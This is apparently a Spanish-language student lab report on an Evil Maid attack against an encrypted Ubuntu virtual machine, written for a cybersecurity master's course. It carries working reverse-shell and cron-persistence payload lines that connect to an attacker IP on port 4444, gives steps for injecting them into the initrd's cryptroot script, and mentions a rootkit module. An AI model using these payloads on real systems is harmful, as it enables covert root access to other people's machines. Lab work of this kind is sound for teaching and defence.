# Tarea 1: Evil Maid

**Maestría en Ciberseguridad**

**Principios de Seguridad en Sistemas Operativos**

**Profesor.**
* Kevin Moraga

**Integrantes**
* Roberto Cordoba - 2025800352
* Daniel Araya - 2020207809
* Andrés Mora - 2013241401

## Introducción

**Evil Maid** es un ataque que se basa en la suposición de que un atacante tiene acceso físico a la computadora de la víctima. El nombre proviene del clásico escenario de peligro, donde una mucama podría manipular la computadora desatendida de un viajero. El atacante puede modificar el sistema operativo o el software de cifrado para robar información sensible, como contraseñas o claves de cifrado. Este ataque es particularmente peligroso porque puede ser difícil de detectar y prevenir [2]. Fue descrito por primera vez en el contexto de sistemas cifrados como TrueCrypt [1].

Este documento detalla la ejecución de un ataque Evil Maid en una máquina virtual corriendo Ubuntu. El objetivo es demostrar cómo un atacante puede comprometer la seguridad de una computadora a través del acceso físico, alterando el proceso de arranque para cargar un rootkit que establece una reverse shell.


## Instrucciones para ejecutar el programa
### Configuración del entorno
![](Tarea%201%20Evil%20Maid/Screenshot%202025-05-25%20at%2011.45.22%E2%80%AFAM.png)

1. El repositorio del proyecto puede ser clonado desde el siguiente enlace: [Evil-Maid](https://github.com/DASBCC/Evil-Maid.git)
Para el entorno del escenario se utilizan las siguientes sistemas operativos en maquinas virtuales de VirtualBox, aqui los siguientes enlaces para descargar los .iso:
* #### Target OS (Ubuntu 14.04 LTS )
  * [Ubuntu 14.04.2 LTS \(Trusty Tahr\)](https://old-releases.ubuntu.com/releases/14.04.3/)
* #### Live USB os: Linux Lite 7.4
  * [Linux Lite 7.4](https://www.linuxliteos.com/download.php?download=enable#download-section)
  * Instalar dependencias
    * `sudo apt install dracut-core` (required for lsinitrd)
* #### Live USB (Kali 2025.1c)
  * [Kali 2025.1c](https://cdimage.kali.org/kali-2025.1c/kali-linux-2025.1c-live-amd64.iso)
  
### Pasos en Ubuntu (Máquina Víctima)
![](Tarea%201%20Evil%20Maid/Screenshot%202025-05-25%20at%2011.12.19%E2%80%AFAM.png)
1. Iniciar la máquina virtual con Ubuntu 14.04.3 y verificar si el disco está cifrado.
2. Ingresar la contraseña del usuario (aunque el atacante no debe conocerla).
3. Validar que el sistema ha iniciado correctamente ejecutando: `whoami`
4. Confirmar que el nombre del host pertenece a la víctima.
5. Apagar la máquina virtual.
6. Restaurar un snapshot de Linux Lite 6.0  con el estado de la máquina para comenzar el ataque para ahorrar tiempo.

### Pasos en Linux Lite (Etapa de Inyección)
![](Tarea%201%20Evil%20Maid/Screenshot%202025-05-25%20at%2011.26.04%E2%80%AFAM.png)
1. Descargar o clonar el repositorio del ataque desde: ~[https://github.com/ExplosiveGalloPinto/EvilMaid-Lab](https://github.com/ExplosiveGalloPinto/EvilMaid-Lab)~
2. Extraer el contenido y acceder al directorio donde se encuentran los siguientes archivos:
   * EvilMaid.sh
   * edit.py
   * payload.txt → **Importante: editar este archivo con la IP del atacante**
     * **Desglose de payload.txt**
       * **Reverse Shell**
         * `bash -i >& /dev/tcp/C2_IP_ADDRESS/PORT 0>&1`
       * **Job de Crontab (opcional para persistencia)**
         * `echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/C2_IP_ADDRESS/PORT 0>&1'" >> /tmp/etc/crontab`
       * **(Previamente montar el sistema cifrado de la víctima si es necesario)**
         * `mount /dev/mapper/ubuntu--vg-root /tmp`
         * `umount /tmp`

* Otorgar permisos de ejecución al script y luego ejecutarlo en terminal
  * `chmod +x EvilMaid.sh`
  * `./EvilMaid.sh`
* Una vez finalizada la inyección, apagar la máquina virtual y retirar el USB.
* Encender nuevamente la maquina victima Ubuntu 14.04.3 y nos movemos a los pasos de Kali Linux

### Pasos en Kali Linux (Recepción del Shell)
![](Tarea%201%20Evil%20Maid/Screenshot%202025-05-25%20at%2012.10.53%E2%80%AFPM.png)
1. Iniciar Kali Linux (2022.1 o 2025.1c en modo Live).
2. Preparar el entorno de escucha ejecutando en la terminal:
   * `nc -lvnp PORT`
3. Esperar la conexión entrante del shell reverso, confirmando que el módulo fue cargado correctamente.

### Video tutorial
* https://www.youtube.com/watch?v=aoToKGCmhbw

## Descripción del Ataque

El ataque **Evil Maid** explota el acceso físico al dispositivo para insertar un payload malicioso en el proceso de arranque. Es eficaz si no hay Secure Boot o protección física contra escritura [2]. 

En este laboratorio universitario, el ataque fue implementado como un proyecto ****con fines exclusivamente educativos y de análisis académico****, sin intención de comprometer sistemas reales o ajenos.

### Implementación del Ataque

El proceso automatizado del ataque fue desarrollado mediante los siguientes componentes:

- `70rdsMaid.sh`: Script principal en Bash que automatiza todo el proceso de inyección. Entre sus funciones:
  - Monta la partición `/boot` del sistema víctima.
  - Extrae el contenido del `initrd.img` usando `lsinitrd`.
  - Inyecta un payload malicioso dentro del script `cryptroot` con ayuda de un script Python auxiliar.
  - Reconstruye el `initrd.img` con el payload persistente incluido.
  - Imprime un mensaje ASCII con `figlet` como firma visual del experimento académico.

- `edit.py`: Script que modifica archivos shell existentes (como `cryptroot`) insertando líneas de payload desde `payload.txt` [2].

- `payload.txt`: Contiene el código del ataque. Monta el volumen lógico de la víctima (`/dev/mapper/ubuntu--vg-root`), luego escribe un cron job malicioso en `/tmp/etc/crontab` que lanza una ****reverse shell persistente**** hacia la IP del atacante en el puerto `4444`. Esta shell se camufla con el nombre `EMShell`[3][4].

Ejemplo del payload inyectado:

```bash
* * * * * root /bin/bash -c 'exec -a EMShell bash -i >& /dev/tcp/192.168.68.108/4444 0>&1'
```

Esto significa que cada minuto se intenta establecer una conexión remota, otorgando acceso al atacante sin necesidad de credenciales.

### Variantes del Ataque Evil Maid

El ataque simulado pertenece a la categoría de ****Kernel-Level Persistence****. Otras variantes conocidas incluyen:

- ****Bootloader Tampering****  
  Modificación de GRUB u otros bootloaders para inyectar código malicioso antes de arrancar el sistema operativo.

- ****BIOS/UEFI-level Implants****  
  Ataques avanzados que residen en firmware, difíciles de detectar incluso para soluciones modernas.

- ****Pre-boot Keyloggers****  
  Capturan contraseñas antes del arranque completo del sistema, incluso en discos cifrados.

### Particularidades de Esta Implementación

- Ejecutado mediante un Live USB (Linux Lite), sin necesidad de autenticación del sistema objetivo.
- Compatible con discos cifrados (simulados en VirtualBox).
- Se utiliza cron para persistencia [3] y bash para el canal reverso [4].
- Automatizado en su totalidad mediante scripting (Bash + Python).
- Pensado para facilitar la comprensión del proceso de arranque en Linux y sus vulnerabilidades.

****⚠️ Importante:**** Todo el código fue desarrollado con fines exclusivamente académicos en el contexto de la Maestría en Ciberseguridad, siguiendo principios éticos y sin intención de ejecutar ataques reales o afectar sistemas de terceros.

## Documentación del ataque

Este ataque fue ejecutado por el grupo de estudiantes en un entorno virtual controlado, simulando un escenario en el que el atacante obtiene acceso físico a la máquina objetivo. A continuación, se resume el procedimiento seguido.

Supongamos que planeamos un ataque a un equipo con sistema operativo Ubuntu y cifrado de disco. Se parte de la premisa de que el atacante ya ha identificado previamente el sistema objetivo y conoce que utiliza Ubuntu con cifrado LVM. En una situación realista, la víctima deja su computadora desatendida, ya sea encendida o apagada. El atacante aprovecha esta oportunidad para ingresar sin ser detectado, accede a la BIOS y verifica que es posible iniciar el sistema desde un dispositivo USB externo. Una vez confirmado esto, procede a arrancar la máquina utilizando una distribución Live de Linux Lite. Desde esta sesión, el atacante monta la partición `/boot` del sistema objetivo, lo cual le permite acceder y extraer el archivo `initrd.img`. Este archivo contiene los scripts necesarios para el proceso de arranque del sistema, incluyendo aquellos que manejan la desencriptación del disco, convirtiéndose en el punto clave para insertar el payload malicioso. Se identifican claramente dos volúmenes: el volumen encriptado que contiene el sistema de archivos principal, y otro que incluye el archivo `initrd.img`, lo cual fue validado antes de proceder con su extracción y manipulación.

1. **Reconocimiento del sistema víctima**:  
   Se inició Ubuntu 14.04 LTS para verificar que el disco estuviera cifrado. Se comprobó el acceso y se apagó la máquina. En este punto se confirma también que el usuario deberá desencriptar el disco al arrancar, y que este proceso está gestionado por el script `cryptroot` contenido dentro del `initrd`.

2. **Preparación del entorno de ataque**:  
   Se utilizó Linux Lite 7.4 en modo Live USB para ejecutar el script `EvilMaid.sh`, que automatiza la extracción, modificación y reempaque del `initrd.img`. El archivo `initrd` fue copiado a un directorio temporal (`~/out`) donde se ejecutó el comando `lsinitrd --unpack` para acceder a su estructura interna. Esta operación permitió navegar hacia el directorio `scripts/local-top/`, donde se encontró el script `cryptroot`, responsable de iniciar el desbloqueo del volumen encriptado durante el arranque.

3. **Inyección del payload**:  
   - El script Bash `70rdsMaid.sh` monta `/boot`, extrae `initrd.img`, y accede al archivo `cryptroot`.
   - Con `edit.py`, se inserta el contenido de `payload.txt`, que incluye una reverse shell persistente programada mediante `cron`.
   - El payload redirige la conexión a una IP controlada por el atacante en el puerto `4444`. Este se integra justo antes de finalizar el script `cryptroot`, garantizando su ejecución inmediatamente después de que el usuario legítimo desbloquee el disco. En las imágenes se aprecia cómo se edita el archivo en terminal, insertando una línea que ejecuta `bash -i >& /dev/tcp/...`.

4. **Reempaque y limpieza**:  
   - Se reconstruye `initrd.img` con el comando `find . | cpio -H newc -o | gzip -9`, asegurando que el formato sea compatible con el sistema de arranque.
   - El archivo resultante reemplaza el `initrd` original en la partición `/boot`. 
   - Se desmonta la unidad y se apaga la máquina. En este punto, todo rastro visible de la manipulación ha sido eliminado, y el sistema parece intacto desde el punto de vista del usuario.

5. **Recepción del shell remoto**:  
   - Con Kali Linux en modo Live, se ejecuta `nc -lvnp 4444` para escuchar la conexión. Se observa en las capturas cómo el atacante recibe una conexión entrante desde la IP de la víctima.
   - Al reiniciar Ubuntu, el cron job ejecuta automáticamente la reverse shell, entregando una sesión remota al atacante. Desde esa terminal remota, se puede realizar cualquier operación como si se estuviera localmente en la máquina objetivo. En la demostración, por ejemplo, se crea el archivo `imhere.txt` directamente sobre el escritorio de la víctima, como prueba del control total alcanzado.

6. **Confirmación del éxito**:  
   - Se comprobó que el acceso remoto se establece correctamente sin intervención del usuario legítimo, posterior al desbloqueo del disco. El proceso ocurre de forma silenciosa, sin mostrar ventanas emergentes o síntomas visibles en pantalla, lo cual valida el nivel de sigilo y eficacia del ataque.

El ataque fue ejecutado de manera automatizada, controlada y con fines exclusivamente educativos.

## Autoevaluación
### Estado final

El estado final de la asignación es **satisfactorio**. Se cumplieron todos los objetivos establecidos, logrando ejecutar exitosamente un ataque tipo *Evil Maid* sobre un sistema con cifrado de disco. La automatización del proceso, mediante scripting en Bash y Python, facilitó la ejecución controlada de cada etapa del ataque, desde la extracción y modificación del archivo `initrd.img` hasta la recepción de una sesión remota con privilegios de root. La reverse shell fue lanzada de forma persistente y silenciosa, sin alertar al usuario, demostrando la efectividad del payload inyectado [4].

### Problemas encontrados

Durante el desarrollo del laboratorio se presentaron algunos desafíos importantes:

- **Errores al reempaquetar el `initrd`**: En algunos intentos, el sistema no reconocía correctamente el archivo modificado debido al formato incorrecto del `cpio`.
- **Incompatibilidad entre versiones del kernel**: Algunos scripts y rutas del `initrd` variaban ligeramente entre versiones, lo que requería adaptación manual.
- **Fallo en cron si no se montaba correctamente `/tmp`**: Al insertar la reverse shell como tarea programada, si el directorio `crontab` no estaba presente, la inyección fallaba silenciosamente.
- **Permisos y privilegios**: Era necesario verificar que el entorno de Live USB tuviera permisos completos para montar, copiar, y modificar archivos del sistema objetivo.
- **Error al cargar el sistema modificado (initramfs shell)**: En una de las pruebas, el sistema no logró ubicar el volumen lógico cifrado (`/dev/mapper/ubuntu--vg-ubuntu--lv`), lo que provocó que se detuviera en el entorno `initramfs`, mostrando el mensaje:  `ALERT! /dev/mapper/ubuntu--vg-ubuntu--lv does not exist. Dropping to a shell!`
  - Esto se debió a una falla en el mapeo del volumen o en la inclusión de módulos necesarios al reconstruir el `initrd`.
  ![](Tarea%201%20Evil%20Maid/image%202.png)
- **Fallo de verificación del módulo `rootkit.ko`**: Aunque el módulo fue insertado correctamente y listado en `lib/modules`, al intentar cargarlo se presentó un mensaje de advertencia: `rootkit: module verification failed: signature and/or required key missing – tainting kernel`
  - Esto indicaba que la verificación de firma del módulo falló debido a que el kernel requería claves de firma digital, generando un *taint* del kernel y potencialmente bloqueando su carga según la configuración de seguridad.
  ![](Tarea%201%20Evil%20Maid/image.png)

### Limitaciones de la implementación

- El ataque no incluye técnicas de evasión frente a sistemas de detección modernos (AV/EDR).
- No se evaluó el ataque en dispositivos con UEFI/Secure Boot habilitado.
- El canal de reverse shell no utiliza cifrado, lo cual podría ser detectable en redes monitoreadas.
- El payload no sobrevive a una reinstalación del sistema ni modifica la BIOS, por lo que la persistencia está limitada al entorno del disco actual.

### Reporte de commits

A continuación se presenta un ejemplo del log de commits en Git utilizado para documentar el desarrollo del ataque:

```
git log --oneline

7615849 Final delivery of all documents
af2063c Sección: Documentación del ataque
b434d6e Fix Makefile path for kernel headers
f9c2bbf Documentation 0.1
be26471 Evil Maid Rootkit 1.0
bd9ddf3 First commit version 1.0
634ea57 Update README.md
392d218 Initial commit
```

### 5.5 Evaluación
| **Criterio**                               | **Puntaje** |
|:------------------------------------------:|:-----------:|
| Inyección y Ejecución de Evil Maid Attack  | 50/50       |
| EM Shell (funcionalidad y conexión remota) | 30/30       |
| Documentación del Ataque                   | 20/20       |
| **Total**                                  | **100/100** |

## Lecciones Aprendidas

1. **FDE (Full Disk Encryption)**:  
   Aprendimos cómo funciona el cifrado completo del disco y su impacto en el proceso de arranque. El disco se divide en dos volúmenes: uno contiene la imagen cifrada del sistema operativo y sus archivos, mientras que el otro volumen contiene la partición de arranque (`/boot`) con los scripts necesarios para iniciar el sistema, incluyendo el archivo `initrd.img`. Esta arquitectura permite que el proceso de desencriptado se inicie antes de cargar el sistema operativo como tal.

2. **initrd (Initial RAM Disk)**:  
   Entendimos que `initrd` es un sistema de archivos temporal que se monta en memoria durante las primeras etapas del arranque. Contiene todos los scripts y controladores necesarios para montar el sistema de archivos raíz. Manipular el contenido de este archivo permite modificar el comportamiento del arranque de forma silenciosa, incluso en sistemas con cifrado activo.

3. **cryptroot**:  
   Identificamos que este script, ubicado en `scripts/local-top/`, es clave en sistemas Linux con cifrado de disco, ya que contiene las instrucciones que permiten desbloquear el volumen lógico principal (`/dev/mapper/ubuntu--vg-root`). Fue el punto exacto donde se insertó el payload, garantizando su ejecución una vez desencriptado el disco [2].

4. **`ubuntu--vg-root`**:  
   Reconocimos que este volumen representa el sistema de archivos real del usuario en sistemas que utilizan LVM. Su correcta identificación y existencia es fundamental para que el sistema arranque. Uno de los errores encontrados durante las pruebas se relacionó con la imposibilidad del kernel para encontrar este volumen, lo cual llevó a una caída al entorno `initramfs`.

5. **Edición in-place**:  
   Durante la automatización del ataque se identificó que la edición in-place (dentro del mismo archivo, sin crear uno nuevo) es delicada y debe hacerse con precisión. Detectamos que, si el archivo era sobrescrito incorrectamente o no se respetaban los permisos y formato del `initrd`, el sistema podía quedar inutilizable.

6. **Carga de módulos del kernel y firmas**:  
   Al intentar insertar el módulo `rootkit.ko`, el sistema generó advertencias relacionadas con la falta de firma digital del módulo. Esto nos permitió comprender cómo los sistemas modernos verifican la integridad de los módulos mediante firmas criptográficas.

7. **Importancia de pruebas iterativas**:  
   El proceso requirió múltiples ciclos de prueba y error. Cada vez que se editaba el `initrd` o se montaba una nueva máquina virtual, había que verificar cuidadosamente los pasos. Esto nos enseñó la importancia de documentar cada modificación.

8. **Impacto real del ataque**:  
   Finalmente, al ejecutar el ataque completo, confirmamos que el control total del sistema objetivo es posible con solo acceso físico y sin necesidad de credenciales.

---
## Bibliografía
* [1] J. Rutkowska. “Evil Maid Goes After TrueCrypt”. 2009. http://theinvisiblethings.blogspot.com/2009/10/evil-maid-goes-after-truecrypt.html
* [2] MITRE ATT&CK. (2024). *T1542.003 Boot or Logon Autostart Execution*. https://attack.mitre.org/techniques/T1542/003/
* [3] GNU Project. *cron*. https://man7.org/linux/man-pages/man8/cron.8.html
* [4] Offensive Security. *Reverse Shell Cheat Sheet*. https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
